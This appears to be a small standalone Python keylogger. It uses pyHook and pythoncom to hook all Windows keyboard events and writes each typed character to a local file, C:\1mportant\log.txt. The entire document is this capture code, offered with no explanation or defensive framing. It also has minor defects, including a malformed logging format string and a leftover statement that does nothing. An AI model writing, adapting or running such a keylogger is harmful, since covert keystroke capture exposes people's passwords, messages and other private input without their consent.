import pyHook, pythoncom, sys, logging

file_log = 'C:\\1mportant\\log.txt'

def OnKeyboardEven(even):
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)') 
	chr(even.Ascii)
	logging.log(10,chr(even.Ascii))
	return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEven
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()